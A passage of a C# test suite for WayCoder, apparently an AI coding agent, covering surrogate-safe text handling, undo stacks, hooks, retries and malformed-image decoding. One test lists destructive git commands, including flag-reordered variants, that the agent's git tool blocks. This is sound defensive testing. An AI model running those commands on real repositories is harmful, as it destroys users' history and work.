                    msg.Contains("ERROR") && !HasLoneSurrogate(msg));
            }
            finally { try { Directory.Delete(docDir, true); } catch { } }
        }
        finally
        {
            try { File.Delete(tmp); } catch { }
        }
    }

    /// <summary>检测字符串中是否含孤立 UTF-16 代理项（半 emoji/扩展区汉字）。</summary>
    private static bool HasLoneSurrogate(string s)
    {
        for (int i = 0; i < s.Length; i++)
        {
            if (char.IsHighSurrogate(s[i]))
            {
                if (i + 1 >= s.Length || !char.IsLowSurrogate(s[i + 1])) return true;
                i++;
            }
            else if (char.IsLowSurrogate(s[i]))
                return true;
        }
        return false;
    }

    /// <summary>v0.71.17 批次：AnsiHelper.WrapLine 兜底按码点取断点，首字符 emoji 在 maxWidth 过窄时不切半。</summary>
    private static void TestV0717RuneSafeWrap(Action<string, bool> Check)
    {
        // maxWidth=1，首字符 😀（宽度 2，代理对）→ 旧代码 breakIdx=1 切出孤立高位代理；新代码取完整码点
        var wrap = AnsiHelper.WrapText("😀a", maxWidth: 1);
        Check("WrapText: maxWidth=1 首字符 emoji 不切半", wrap.Count == 2 && wrap[0] == "😀" && !HasLoneSurrogate(wrap[0]));

        // CJK 首字符（宽度 2，非代理对）在 maxWidth=1 时不越界、不抛异常、无孤立代理
        var wrapCjk = AnsiHelper.WrapText("中abc", maxWidth: 1);
        Check("WrapText: CJK 首字符 maxWidth=1 不抛异常", wrapCjk.Count > 0 && !HasLoneSurrogate(string.Concat(wrapCjk)));

        // 英文折行仍正常（空格处断行）
        var wrapEn = AnsiHelper.WrapText("hello world", maxWidth: 5);
        Check("WrapText: 英文折行正常", wrapEn.Count == 2 && wrapEn[0] == "hello" && wrapEn[1] == "world");
    }

    /// <summary>v0.71.17 批次：UI 层确定性 bug —— 撤销栈修剪方向反 / 全分隔线菜单空序列 / BoxBuffer 负宽度。</summary>
    private static void TestV0717UiDeterministic(Action<string, bool> Check)
    {
        // ── #1 EditorCore.TrimBottom：Stack.ToArray 栈顶在前，应保留最新 max 条（旧代码保留最旧、丢弃最新）──
        var undo = new Stack<string>();
        undo.Push("oldest"); undo.Push("mid"); undo.Push("newest"); // 栈顶 = newest
        WayCoder.UI.Tui.Edit.EditorCore.TrimBottom(undo, 2);
        Check("EditorCore.TrimBottom: 保留最新 2 条", undo.Count == 2 && undo.Pop() == "newest" && undo.Pop() == "mid");

        // ── #2 TuiMenu：列表全为分隔线时 .Max() 空序列崩溃 ──
        bool menuOk = true;
        try { _ = TuiMenu.Show("", new List<string> { "---" }, 0, 0); }
        catch { menuOk = false; }
        Check("TuiMenu: 全分隔线菜单不崩溃", menuOk);

        // ── #3 BoxBuffer.Fill：带边框且 Width<2 时 ContentWidth 为负，new string(ch, 负) 抛异常 ──
        var bb = new BoxBuffer { X = 0, Y = 0, Width = 1, Height = 3, Border = BorderStyle.Single };
        bool fillOk = true;
        try { bb.Fill(new StringBuilder()); } catch { fillOk = false; }
        Check("BoxBuffer.Fill: 窄边框负宽度不抛异常", fillOk);
    }

    private static void TestV0718SharedMemoryGet(Action<string, bool> Check)
    {
        // ── StructuredMemory.Get 只搜槽位目录 → 共享记忆按名查不到（ListAll 却加载共享目录，语义错位）──
        var savedCwd = Directory.GetCurrentDirectory();
        var savedSlot = StructuredMemory.CurrentSlotIndex;
        var dir = Path.Combine(Path.GetTempPath(), "waycoder_memget_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(dir);
        try
        {
            Directory.SetCurrentDirectory(dir);
            StructuredMemory.CurrentSlotIndex = 7; // 独立槽位，避免污染真实槽位

            // 槽位独立记忆（Create → SlotMemoryDir）
            StructuredMemory.Create("slot-only", "槽位专属记忆", "project", "只在 slot_7");

            // 共享记忆：直接写入 SharedMemoryDir 根目录（模拟 PullSharedAsync 拉取的团队记忆）
            var sharedDir = StructuredMemory.SharedMemoryDir;
            File.WriteAllText(Path.Combine(sharedDir, "team-convention.md"),
                "---\nname: team-convention\ndescription: 团队命名规范\ntype: project\nshared: true\n---\n统一使用 PascalCase。");

            Check("Get: 槽位独立记忆可查", StructuredMemory.Get("slot-only")?.Description == "槽位专属记忆");
            Check("Get: 共享记忆按名可查（修复前返回 null）", StructuredMemory.Get("team-convention")?.Description == "团队命名规范");
            Check("ListAll: 共享 + 槽位均列出", StructuredMemory.ListAll().Count == 2);

            // 同名冲突：槽位独立记忆优先于共享记忆
            File.WriteAllText(Path.Combine(sharedDir, "slot-only.md"),
                "---\nname: slot-only\ndescription: 共享同名\ntype: reference\nshared: true\n---\n共享版本");
            Check("Get: 同名冲突槽位优先", StructuredMemory.Get("slot-only")?.Description == "槽位专属记忆");
        }
        finally
        {
            Directory.SetCurrentDirectory(savedCwd);
            StructuredMemory.CurrentSlotIndex = savedSlot;
            try { Directory.Delete(dir, true); } catch { }
        }
    }

    private static void TestV0719CjkExtB(Action<string, bool> Check)
    {
        // ── SemanticMemory.Tokenize 扩展 B 区汉字（代理对）被 char 迭代静默丢弃 → 召回率缺陷 ──
        const string extB = "\U00020BB7"; // 𠮷（扩展 B，UTF-16 代理对）；野=U+91CE、家=U+5BB6（BMP 基本区）

        var tokens = SemanticMemory.Tokenize(extB + "野家");
        Check("Tokenize: 扩展 B 汉字作为单 token 保留", tokens.Contains(extB));
        Check("Tokenize: BMP 汉字 bigram 不受影响", tokens.Contains("野家"));
        Check("Tokenize: 无孤立代理项", !tokens.Any(HasLoneSurrogate));

        // emoji（非扩展 B 代理对）应成对跳过，不产生 token、不残留孤立代理项
        var emojiTokens = SemanticMemory.Tokenize("\U0001F600" + "ab"); // 😀 + ab
        Check("Tokenize: emoji 代理对不产生 token", !emojiTokens.Any(t => t.Contains('\ud83d')) && emojiTokens.Contains("ab"));

        // 扩展 B 查询可命中含扩展 B 的记忆
        var docs = new List<SemanticMemory.MemoryDocument>
        {
            new() { Title = "地名", Content = extB + "野家是日本拉面店", Index = 0 },
            new() { Title = "无关", Content = "hello world", Index = 1 },
        };
        var hits = SemanticMemory.SearchRelevant(docs, extB + "野家", 5);
        Check("Search: 扩展 B 查询命中对应文档", hits.Count > 0 && hits[0].Doc.Index == 0);
    }

    private static void TestV0720InfraDeterministic(Action<string, bool> Check)
    {
        // ── #1 HooksManager：session hook 前缀碰撞（"PostToolUseFailure_xxx".StartsWith("PostToolUse")）──
        HooksManager.Enabled = true;
        HooksManager.ClearSessionHooks();
        int failureHookCalls = 0;
        var hookId = HooksManager.RegisterSessionHook(HookEvent.PostToolUseFailure, ctx =>
        {
            Interlocked.Increment(ref failureHookCalls);
            return Task.FromResult<HookOutput?>(null);
        });
        try
        {
            // 触发 PostToolUse（成功）事件 —— 修复前会误触发 PostToolUseFailure 专属 hook
            HooksManager.RunPostToolUseAsync("test", new Dictionary<string, object?>(), "ok").GetAwaiter().GetResult();
            Check("Hooks: PostToolUse 不误触发 PostToolUseFailure hook", failureHookCalls == 0);

            // 触发 PostToolUseFailure 事件 —— 应正确触发
            HooksManager.RunPostToolUseFailureAsync("test", new Dictionary<string, object?>(), "err").GetAwaiter().GetResult();
            Check("Hooks: PostToolUseFailure 正确触发", failureHookCalls == 1);
        }
        finally
        {
            HooksManager.UnregisterSessionHook(hookId);
            HooksManager.ClearSessionHooks();
        }

        // ── #2 FileIgnoreManager：未转义的 [ 生成非法正则，Match 时抛 ArgumentException ──
        var ignoreDir = Path.Combine(Path.GetTempPath(), "waycoder_ignore_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(ignoreDir);
        try
        {
            File.WriteAllText(Path.Combine(ignoreDir, ".gitignore"), "foo[\n*.tmp\n");
            FileIgnoreManager.ClearCache();
            bool ignoreOk = true;
            try
            {
                ignoreOk = FileIgnoreManager.IsIgnored("foo[", ignoreDir); // 字面匹配 "foo["，修复前 new Regex 抛异常
                _ = FileIgnoreManager.IsIgnored("x.tmp", ignoreDir);
            }
            catch { ignoreOk = false; }
            Check("FileIgnore: 含未闭合 [ 的规则不崩溃", ignoreOk);
            Check("FileIgnore: [ 按字面量匹配（不误匹配）", !FileIgnoreManager.IsIgnored("foobar.txt", ignoreDir));
        }
        finally
        {
            FileIgnoreManager.ClearCache();
            try { Directory.Delete(ignoreDir, true); } catch { }
        }

        // ── #3 RetryPolicy：MaxRetries 负数 → for 立即为 false，action 不执行、误抛 InvalidOperationException ──
        int retryCalls = 0;
        var retryResult = RetryPolicy.RetryAsync<int>(
            () => { retryCalls++; return Task.FromResult(7); },
            new RetryConfig { MaxRetries = -1 }).GetAwaiter().GetResult();
        Check("Retry: MaxRetries 负数钳制为 0 且执行一次", retryCalls == 1 && retryResult == 7);

        // ── #4 RetryPolicy：NoRetryExceptions 显式置 null → ShouldRetry 抛 NRE ──
        var nullNoRetry = new RetryConfig { NoRetryExceptions = null! };
        bool shouldRetryOk = true;
        try { _ = nullNoRetry.ShouldRetry(new InvalidOperationException()); }
        catch { shouldRetryOk = false; }
        Check("Retry: NoRetryExceptions null 不抛 NRE", shouldRetryOk);
    }

    private static void TestV0721FileTrackerRead(Action<string, bool> Check)
    {
        // ── #1 ReadFileTool：limit<=0 未钳制 → Take(0) 返回空 + 误导性「还有更多行」提示 ──
        var readFile = Path.Combine(Path.GetTempPath(), "waycoder_read_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
        File.WriteAllText(readFile, "line1\nline2\nline3\n");
        try
        {
            var tool = new ReadFileTool();
            var r = tool.ExecuteAsync(new Dictionary<string, object?> { ["file_path"] = readFile, ["limit"] = 0 }).GetAwaiter().GetResult();
            Check("ReadFile: limit<=0 钳制为至少读 1 行", r.Contains("line1"));
        }
        finally { try { File.Delete(readFile); } catch { } }

        // ── #2 FileTracker：RecordWrite 未更新 LastReadTimes → Agent 自己写后编辑仍被拦「尚未读取」 ──
        var ftFile = Path.Combine(Path.GetTempPath(), "waycoder_ft_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
        File.WriteAllText(ftFile, "v1");
        try
        {
            FileTracker.Enabled = true;
            FileTracker.Reset();
            FileTracker.RecordWrite(ftFile); // Agent 自己写文件（未先 read）
            var warn = FileTracker.ValidatePreEdit(ftFile);
            Check("FileTracker: Agent 自己写后无需先读", warn == null);
        }
        finally
        {
            FileTracker.Reset();
            try { File.Delete(ftFile); } catch { }
        }
    }

    /// <summary>v0.71.22 批次：FindReplaceTool 上下文窗口 + ErrorLog 工具参数截断走码点边界，代理对不切半。</summary>
    private static void TestV0722RuneSafeContext(Action<string, bool> Check)
    {
        // ── #1 FindReplaceTool：匹配上下文窗口 start 落代理对中间 → Substring 切半出孤立代理（U+FFFD）──
        // 30×a + 😀 + 29×a + "MATCH"：match.Index=61，start=31（😀 的低位代理）→ 旧代码 Substring(31) 切半
        var dir = Path.Combine(Path.GetTempPath(), "waycoder_fr_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(dir);
        var file = Path.Combine(dir, "sample.txt");
        File.WriteAllText(file, new string('a', 30) + "\U0001F600" + new string('a', 29) + "MATCH");
        try
        {
            var tool = new FindReplaceTool();
            var r = tool.ExecuteAsync(new Dictionary<string, object?>
            {
                ["path"] = dir, ["pattern"] = "MATCH", ["dry_run"] = true, ["glob"] = "*.txt"
            }).GetAwaiter().GetResult();
            Check("find_replace: 上下文窗口不切半代理对", !HasLoneSurrogate(r));
            Check("find_replace: emoji 完整保留", r.Contains("\U0001F600"));
        }
        finally { try { Directory.Delete(dir, true); } catch { } }

        // ── #2 ErrorLog.ToolError：content 截断到 100 码点不切半（旧代码 [..100] 切在 😀 代理对中间）──
        ErrorLog.ToolError("emoji_tool", "截断测试", null,
            new Dictionary<string, object?> { ["content"] = new string('a', 99) + "\U0001F600" + "bbb" });
        ErrorLog.Flush();
        var logsDir = Path.Combine(Directory.GetCurrentDirectory(), ErrorLog.LogDirName);
        var logFiles = Directory.GetFiles(logsDir, "error_*.log");
        if (logFiles.Length > 0)
        {
            var latest = File.ReadAllText(logFiles.OrderByDescending(f => f).First(), System.Text.Encoding.UTF8);
            var line = latest.Split('\n').FirstOrDefault(l => l.Contains("[Tool:emoji_tool]"));
            Check("ErrorLog: content 截断不切半代理对", line != null && !HasLoneSurrogate(line));
            Check("ErrorLog: emoji 完整保留", line != null && line.Contains("\U0001F600"));
        }
        else
        {
            Check("ErrorLog: 日志文件存在", false);
        }
    }

    /// <summary>v0.71.23 批次：GitTool 危险操作 token 级拦截 + EditorCore 上下移动代理对修正。</summary>
    private static void TestV0723SafetyAndCursor(Action<string, bool> Check)
    {
        // ── #1 GitTool：整串子串匹配可被 flag 后置绕过（push origin main --force 不含 "push --force"）──
        Check("git 危险: push --force 前置拦截", GitTool.HasBlockedGitOperation("push --force origin main"));
        Check("git 危险: push flag 后置也拦截", GitTool.HasBlockedGitOperation("push origin main --force"));
        Check("git 危险: push -f 后置拦截", GitTool.HasBlockedGitOperation("push -u origin main -f"));
        Check("git 危险: reset --hard 后置拦截", GitTool.HasBlockedGitOperation("reset HEAD --hard"));
        Check("git 危险: clean -f 后置拦截", GitTool.HasBlockedGitOperation("clean src/ -f"));
        Check("git 危险: branch -D 拦截", GitTool.HasBlockedGitOperation("branch -D feature"));
        Check("git 危险: stash drop 拦截", GitTool.HasBlockedGitOperation("stash drop"));
        Check("git 危险: checkout -- . 拦截", GitTool.HasBlockedGitOperation("checkout -- ."));
        Check("git 安全: push 普通放行", !GitTool.HasBlockedGitOperation("push origin main"));
        Check("git 安全: force-with-lease 放行", !GitTool.HasBlockedGitOperation("push --force-with-lease"));
        Check("git 安全: branch -d 普通删除放行", !GitTool.HasBlockedGitOperation("branch -d feature"));
        Check("git 安全: status/log 放行", !GitTool.HasBlockedGitOperation("status") && !GitTool.HasBlockedGitOperation("log --oneline"));

        // ── #2 EditorCore：上下移动落到代理对中间（修复前 Cx=1 切半 emoji，Backspace 破坏文件）──
        var emojiDown = new WayCoder.UI.Tui.Edit.EditorCore();
        emojiDown.Lines.Add(new StringBuilder("ab"));
        emojiDown.Lines.Add(new StringBuilder("\U0001F600cd")); // "😀cd"
        emojiDown.Cy = 0;
        emojiDown.Cx = 1;
        emojiDown.MoveCursor(0, 1); // ↓ 到 emoji 行，Cx=1 落在 high(0)/low(1) 之间
        Check("MoveCursor 下移不落代理对中间", emojiDown.Cy == 1 && emojiDown.Cx == 0);
    }

    /// <summary>v0.71.24 批次：Syntax.Tokenize 代理对成对 token（不切半）。</summary>
    private static void TestV0724SyntaxSurrogate(Action<string, bool> Check)
    {
        // ── Syntax.Tokenize 逐 char 兜底分支把 emoji/CJK 扩展 B 切成两个孤立代理 token ──
        var syn = WayCoder.UI.Tui.Edit.Syntax.ForFile("test.cs");
        var tokens = syn.Tokenize("a\U0001F600b"); // "a😀b"：😀 落「其他字符」分支
        Check("Syntax: 代理对成对 token 不切半", tokens.Any(t => t.Text == "\U0001F600"));
        Check("Syntax: 无孤立代理项", !tokens.Any(t => HasLoneSurrogate(t.Text)));
    }

    /// <summary>v0.71.25 批次：DrawCommands path 首点丢失 + PngDecoder 长度溢出 + BmpCodec 32 位 alpha + 历史预览代理对切半。</summary>
    private static void TestV0725DrawAndCodec(Action<string, bool> Check)
    {
        // ── #1 PathCommand.ParsePathSegments：cx 初始为 0（非 NaN）导致首个数字被误当 y 与 x=0 配对，首点丢失 ──
        var seg = WayCoder.Infra.PathCommand.ParsePathSegments("M 10 20 L 30 40");
        Check("path: 首点坐标不丢失", seg.Count == 2 && seg[0].X == 10 && seg[0].Y == 20 && seg[1].X == 30 && seg[1].Y == 40);

        // ── #2 PngDecoder：chunk 长度 0x7FFFFFFF 使 off+len 整数溢出为负、绕过越界检查 → 负索引崩溃 ──
        var png = new byte[8 + 8 + 13];
        png[0] = 0x89; png[1] = 0x50; png[2] = 0x4E; png[3] = 0x47;
        png[4] = 0x0D; png[5] = 0x0A; png[6] = 0x1A; png[7] = 0x0A;
        png[8] = 0x7F; png[9] = 0xFF; png[10] = 0xFF; png[11] = 0xFF; // len = 0x7FFFFFFF（正数，绕过 len<0 检查）
        png[12] = (byte)'I'; png[13] = (byte)'H'; png[14] = (byte)'D'; png[15] = (byte)'R';
        bool fmt = false;
        try { WayCoder.Infra.PngDecoder.Decode(png); }
        catch (FormatException) { fmt = true; }
        catch (Exception) { /* 溢出崩溃/越界异常视为未正确拦截 */ }
        Check("PngDecoder: chunk 长度整数溢出抛 FormatException 而非越界崩溃", fmt);

        // ── #3 BmpCodec：32 位 BI_RGB 第 4 字节为保留位（常为 0），旧代码读作 alpha 使图像全透明 ──
        var bmp = new byte[58];
        bmp[0] = (byte)'B'; bmp[1] = (byte)'M';
        bmp[10] = 54;  // dataOffset
        bmp[14] = 40;  // dibSize
        bmp[18] = 1;   // width
        bmp[22] = 1;   // height
        bmp[28] = 32;  // bpp=32（compression 默认 0 = BI_RGB）
        bmp[54] = 0x10; bmp[55] = 0x20; bmp[56] = 0x30; bmp[57] = 0x00; // B,G,R,保留字节=0
        var img = WayCoder.Infra.BmpCodec.Decode(bmp);
        Check("Bmp32: 保留字节不误当 alpha", img.Rgba[3] == 255);
        Check("Bmp32: RGB 通道正确", img.Rgba[0] == 0x30 && img.Rgba[1] == 0x20 && img.Rgba[2] == 0x10);

        // ── #4 BuildHistoryPreview：start 落在 emoji 低位代理 → Substring 切半出孤立代理（U+FFFD）──
        // 39×a + 😀 + 39×a + "keyword"：idx=80，start=40 恰为 😀 的低位代理
        var content = new string('a', 39) + "\U0001F600" + new string('a', 39) + "keyword";
        var preview = Program.BuildHistoryPreview(content, "keyword");
        Check("history: 预览不切半代理对", !HasLoneSurrogate(preview));
        Check("history: emoji 完整保留", preview.Contains("\U0001F600"));
    }

    /// <summary>v0.71.25 批次：ToolArgs 整数取数（long 不再静默丢参）+ MultiEditTool 兼容 List&lt;object?&gt;。</summary>
    private static void TestV0725ToolArgsAndEdit(Action<string, bool> Check)
    {
        // ── #1 ToolArgs.GetInt：JSON 整数经 ParseJsonNumber 解析为 long，旧代码 is int 不匹配静默丢参回退默认 ──
        var args = new Dictionary<string, object?>();
        args["timeout"] = 5L; // long（LLM 真实形态）
        Check("ToolArgs: long 参数不再丢弃", ToolArgs.GetInt(args, "timeout", 120) == 5);
        args["timeout"] = 6;  // int
        Check("ToolArgs: int 参数", ToolArgs.GetInt(args, "timeout", 120) == 6);
        args["timeout"] = 7.9; // double 截断
        Check("ToolArgs: double 参数截断", ToolArgs.GetInt(args, "timeout", 120) == 7);
        args["timeout"] = "8"; // string 解析
        Check("ToolArgs: string 参数解析", ToolArgs.GetInt(args, "timeout", 120) == 8);
        Check("ToolArgs: 缺失回退默认值", ToolArgs.GetInt(new Dictionary<string, object?>(), "timeout", 120) == 120);

        // ── #2 MultiEditTool：edits 为 List<object?>（LLM 真实形态）旧代码 is JNode 恒 false → 解析为空、工具失效 ──
        var dir = Path.Combine(Path.GetTempPath(), "waycoder_me_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(dir);
        var file = Path.Combine(dir, "a.txt");
        File.WriteAllText(file, "hello world");
        FileTracker.RecordRead(file); // 模拟 read_file 读取，否则 ValidatePreEdit 会拦截编辑
        try
        {
            var tool = new MultiEditTool();
            var r = tool.ExecuteAsync(new Dictionary<string, object?>
            {
                ["file_path"] = file,
                ["edits"] = new List<object?>
                {
                    new Dictionary<string, object?> { ["old_string"] = "hello", ["new_string"] = "hi" }
                }
            }).GetAwaiter().GetResult();
            Check("multiedit: List<object?> edits 不再失效", !r.Contains("至少需要一个编辑操作"));
            Check("multiedit: 编辑实际生效", File.ReadAllText(file) == "hi world");
        }
        finally { try { Directory.Delete(dir, true); } catch { } FileTracker.Reset(); }
    }

    /// <summary>v0.71.26 批次：符号链接环深度上限 + cd 后相对路径基于 CurrentCwd + TuiGrid 星号轨不溢出。</summary>
    private static void TestV0726SymlinkCdAndUi(Action<string, bool> Check)
    {
        // ── #1 符号链接环：sub/loop -> sub 自引用，旧代码无限递归 → StackOverflow 直接崩溃进程 ──
        var loopDir = Path.Combine(Path.GetTempPath(), "waycoder_loop_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(loopDir);
        var loopSub = Path.Combine(loopDir, "sub");
        Directory.CreateDirectory(loopSub);
        File.WriteAllText(Path.Combine(loopSub, "a.txt"), "hello");
        try
        {
            Directory.CreateSymbolicLink(Path.Combine(loopSub, "loop"), loopSub); // loop -> sub（自引用环）
            var r = new GrepTool().ExecuteAsync(new Dictionary<string, object?>
            {
                ["pattern"] = "hello",
                ["path"] = loopDir
            }).GetAwaiter().GetResult();
            Check("symlink: grep 不因符号链接环崩溃", r.Contains("a.txt"));
        }
        catch (Exception)
        {
            // 平台/权限不支持符号链接 → 跳过（不视为失败）
        }
        finally { try { Directory.Delete(loopDir, true); } catch { } }

        // ── #2 cd 后相对路径：工具相对路径基于 CurrentCwd 而非进程 cwd ──
        var cwdDir = Path.Combine(Path.GetTempPath(), "waycoder_cwd_" + Guid.NewGuid().ToString("N")[..6]);
        var cwdSub = Path.Combine(cwdDir, "sub");
        Directory.CreateDirectory(cwdSub);
        File.WriteAllText(Path.Combine(cwdSub, "hello.txt"), "hello world");
        var oldCwd = CwdContext.Current.Value;
        CwdContext.Current.Value = cwdDir;
        try
        {
            var r = new ReadFileTool().ExecuteAsync(new Dictionary<string, object?> { ["file_path"] = "sub/hello.txt" }).GetAwaiter().GetResult();
            Check("cd: read_file 相对路径基于 CurrentCwd", r.Contains("hello world"));
            var ls = new LsTool().ExecuteAsync(new Dictionary<string, object?> { ["path"] = "sub" }).GetAwaiter().GetResult();
            Check("cd: ls 相对路径基于 CurrentCwd", ls.Contains("hello.txt"));
        }
        finally
        {
            CwdContext.Current.Value = oldCwd!; // 恢复原值（null 时回到未设置状态）
            try { Directory.Delete(cwdDir, true); } catch { }
        }

        // ── #3 TuiGrid 星号轨：小剩余空间 + 多星轨，旧代码 Math.Max(1,...) 使前面各轨和超过 remaining、
        //        最后一轨拿到负值被抬到 1，总和溢出 totalSpace ──
        var defs5 = new GridSize[5];
        for (int i = 0; i < 5; i++) defs5[i] = new GridSize { Value = 1, IsStar = true };
        var sizes5 = TuiGrid.ResolveSizes(5, defs5, 2, 0);
        Check("grid: 多星轨小空间总和不超过 totalSpace", sizes5.Sum() <= 2);
        Check("grid: 无负尺寸", sizes5.All(s => s >= 0));
        Check("grid: 剩余空间被最后一个星轨完全吸收", sizes5.Sum() == 2);
    }

    /// <summary>v0.71.28 批次：JPEG/BMP 编解码解析损坏输入时缺少边界校验导致越界读（IndexOutOfRange）而非干净 FormatException。</summary>
    private static void TestV0728CodecBounds(Action<string, bool> Check)
    {
        // 辅助：解码必须抛 FormatException（干净拒绝），任何 IndexOutOfRange/ArgumentOutOfRange 等越界异常视为未正确拦截
        static bool JpegThrowsFormat(byte[] data)
        {
            try { WayCoder.Infra.JpegCodec.Decode(data); return false; }
            catch (FormatException) { return true; }
            catch { return false; }
        }

        // ── #1 SOF0 段长度=2（空 payload）：旧代码先读 height/width/nComp 再校验，越界读 data[pos+5] ──
        Check("jpeg: 截断 SOF0 抛 FormatException", JpegThrowsFormat(new byte[] { 0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x02 }));

        // ── #2 SOS 段 Ns=255 但长度=6：旧代码按 Ns 循环读分量条目，越过 end 越界读 ──
        Check("jpeg: 截断 SOS 抛 FormatException", JpegThrowsFormat(new byte[] { 0xFF, 0xD8, 0xFF, 0xDA, 0x00, 0x06, 0xFF, 0x00, 0x00, 0x00 }));

        // ── #3 DQT 段长度=7（只有表头 1 字节）：旧代码连读 64 字节量化表越过 end ──
        Check("jpeg: 截断 DQT 抛 FormatException", JpegThrowsFormat(new byte[] { 0xFF, 0xD8, 0xFF, 0xDB, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00 }));

        // ── #4 BMP dataOffset 为负（0x80000000）：旧代码负索引越界读 ──
        var bmp = new byte[54];
        bmp[0] = (byte)'B'; bmp[1] = (byte)'M';
        bmp[10] = 0x00; bmp[11] = 0x00; bmp[12] = 0x00; bmp[13] = 0x80; // dataOffset = 0x80000000 = 负
        bool bmpFmt = false;
        try { WayCoder.Infra.BmpCodec.Decode(bmp); }
        catch (FormatException) { bmpFmt = true; }
        catch { }
        Check("bmp: 负 dataOffset 抛 FormatException", bmpFmt);
    }

    /// <summary>v0.71.29 批次：整数参数钳制 + 编辑器跳列代理对 + 窄宽截断 + 上下文窗口下限。</summary>
    private static void TestV0729BoundsAndRunes(Action<string, bool> Check)
    {
        // ── #1 ToolArgs.GetInt：超 int 范围 long 静默截断为负/小值 → 钳制而非截断 ──
        var args = new Dictionary<string, object?> { ["limit"] = 3000000000L };
        Check("ToolArgs: 超范围 long 钳制到 int.MaxValue", ToolArgs.GetInt(args, "limit", 0) == int.MaxValue);
        args["limit"] = double.NaN;
        Check("ToolArgs: NaN 回退默认值", ToolArgs.GetInt(args, "limit", 5) == 5);
        args["limit"] = -5L;
        Check("ToolArgs: 负 long 正常保留", ToolArgs.GetInt(args, "limit", 0) == -5);

        // ── #2 EditorCore.JumpToLineCol：列落在代理对中间时向右对齐，插入不切半（保存才不 U+FFFD）──
        var ec = new WayCoder.UI.Tui.Edit.EditorCore();
        ec.Lines.Add(new StringBuilder("😀")); // 😀 = 2 码元（代理对）
        ec.JumpToLineCol(0, 1); // col=1 落在代理对中间
        Check("editor: 跳列落代理对中间向右对齐", ec.Cx == 2);
        ec.InsertText("x");
        Check("editor: 代理对中间插入不切半", ec.Lines[0].ToString() == "😀x");

        // ── #3 AnsiHelper.TruncateByWidth：maxWidth=1 时省略号（宽2）放不下，返回超宽 "…" → 退化无省略号 ──
        var t1 = AnsiHelper.TruncateByWidth("abc", 1);
        Check("tui: 1 列截断不超宽", AnsiHelper.DisplayWidth(t1) <= 1);

        // ── #4 ContextManager：maxTokens≤0 回退默认窗口（否则阈值全 0 + ReportProgress 除零得 NaN）──
        var cm0 = new ContextManager(0);
        Check("ctx: MaxTokens≤0 回退默认窗口", cm0.MaxTokens > 0);
    }

    private static void TestV0730SlotAsyncLocal(Action<string, bool> Check)
    {
        // ── #7 StructuredMemory.CurrentSlotIndex AsyncLocal 隔离：
        //    后台槽位任务启动时捕获自己的槽位值，主线程后续切槽位不污染正在运行的任务（双向）。
        //    修复前为全局 static——任务内 await 后读到主线程切的新槽位值 → 记忆写错目录。──
        var saved = StructuredMemory.CurrentSlotIndex;
        int insideAfterMainSwitch = -1;
        int mainAfter = -1;
        try
        {
            StructuredMemory.CurrentSlotIndex = 5;     // 主线程当前槽位
            var t = System.Threading.Tasks.Task.Run(async () =>
            {
                StructuredMemory.CurrentSlotIndex = 9; // 槽位任务启动点绑定自己的槽位（镜像 StartSlotTask）
                await System.Threading.Tasks.Task.Delay(50); // 模拟任务运行中，主线程此刻切槽位
                insideAfterMainSwitch = StructuredMemory.CurrentSlotIndex;
            });
            StructuredMemory.CurrentSlotIndex = 3;     // 主线程切换槽位（SwitchAgentSlot）
            t.Wait();
            mainAfter = StructuredMemory.CurrentSlotIndex;
        }
        finally
        {
            StructuredMemory.CurrentSlotIndex = saved;
        }
        Check("记忆槽位: 主线程切槽位不污染后台任务(仍9)", insideAfterMainSwitch == 9);
        Check("记忆槽位: 后台任务不污染主线程(仍3)", mainAfter == 3);
    }

    private static void TestV0730TuiExperience(Action<string, bool> Check)
    {
        // ── markdown 长段落折行（v0.71.30 修复：快速路径不再把整段作单行右截断不可见）──
        var longText = new string('字', 60); // 60 汉字，宽 120
        var rows = WayCoder.UI.Tui.TuiMarkdown.RenderMessage(longText, "assistant", 20);
        Check("md: 长段落折成多行", rows.Count > 1);

        // ANSI 内容行不折行（避免切半转义序列，交给 WriteAt ANSI 感知截断）
        var ansiText = "\x1b[32m" + new string('字', 30) + "\x1b[0m";
        var ansiRows = WayCoder.UI.Tui.TuiMarkdown.RenderMessage(ansiText, "tool", 20);
        Check("md: ANSI 行不折行（不切半转义）", ansiRows.Count == 1);
    }

    private static void TestV0730UiUndo(Action<string, bool> Check)
    {
        // ── TuiTextArea 撤销栈健壮性（v0.71.30 修复：4 处）──

        // 1. Text 整体替换（发送消息清空输入）后撤销历史清空：不再引用旧行崩溃
        var ta1 = new TuiTextAreaPasteProbe { Text = "a\nb" };
        ta1.CursorRow = 0; ta1.CursorCol = 0;
        ta1.Paste("X\nY");   // 记录多行插入 'I'(0,0,"X\nY")
        ta1.Text = "";       // 整体替换 → Lines=[""]，栈应清空
        ta1.UndoAction();    // 修复前：Undo 对 1 行列表 RemoveAt(1) → ArgumentOutOfRangeException
        Check("ta: Text 替换后撤销不越界", ta1.Lines.Count >= 1);

        // 2. 拆行后撤销不重复自动缩进
        var ta2 = new TuiTextAreaPasteProbe { Text = "  hello" };
        ta2.CursorRow = 0; ta2.CursorCol = 7;
        ta2.NewLine();       // InsertNewLine → ["  hello","  "] 记录 'S'(0,7,"\n  ")
        ta2.UndoAction();    // 合并 → 修复前 "  hello  "（缩进重复），修复后 "  hello"
        Check("ta: 撤销拆行不重复缩进", ta2.Text == "  hello");

        // 3. MaxLines 裁剪后撤销不越界
        var ta3 = new TuiTextAreaPasteProbe { Text = "a\nb", MaxLines = 2 };
        ta3.CursorRow = 1; ta3.CursorCol = 1;
        ta3.Paste("X\nY");   // 插入 → trim → ["bX","Y"]，记录 'I'(1,1,...) 后栈行号修正
        ta3.UndoAction();    // 修复前：RemoveAt(2) → ArgumentOutOfRangeException
        Check("ta: MaxLines 裁剪后撤销不越界", ta3.Lines.Count >= 1);

        // ── EditorCore 替换可撤销 + 无效正则不崩 ──
        var ec = new WayCoder.UI.Tui.Edit.EditorCore();
        ec.Lines.Add(new System.Text.StringBuilder("foo foo bar"));
        int n = ec.ReplaceAll("foo", "baz");
        Check("editor: ReplaceAll 生效", n == 2 && ec.Lines[0].ToString() == "baz baz bar");
